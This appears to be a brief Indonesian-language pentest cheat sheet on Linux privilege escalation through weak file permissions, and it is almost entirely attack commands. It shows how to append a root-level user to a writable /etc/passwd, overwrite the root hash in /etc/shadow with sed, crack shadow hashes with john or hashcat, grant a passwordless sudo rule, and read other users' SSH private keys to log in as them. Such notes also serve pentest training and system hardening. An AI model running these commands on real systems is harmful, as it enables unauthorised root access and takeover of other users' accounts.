# Weak File Permission

## Cek permission
```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers.d/
```

## /etc/passwd writable
```bash
# Generate hash
openssl passwd -1 pass123

# Tambah root user
echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker    # -> root
```

## /etc/shadow readable
Crack root hash dengan `john` atau `hashcat`.

## /etc/shadow writable
```bash
# Generate hash baru
openssl passwd -1 pass123

# Atau dengan mkpasswd
mkpasswd -m sha-512 pass123

# Backup dan replace root hash
cp /etc/shadow /tmp/shadow.bak

# Edit /etc/shadow, ganti hash root (field ke-2)
# Format: root:<HASH>:19000:0:99999:7:::

# Contoh dengan sed (ganti hash root)
sed -i 's|^root:[^:]*:|root:$1$xyz$hash_disini:|' /etc/shadow

# Login sebagai root
su root   # password: pass123
```

## /etc/sudoers.d/ writable
Tambah `<user> ALL=(ALL) NOPASSWD: ALL`

## SSH private key readable
```bash
cat /home/<user>/.ssh/id_rsa
```
Gunakan untuk login sebagai user lain.
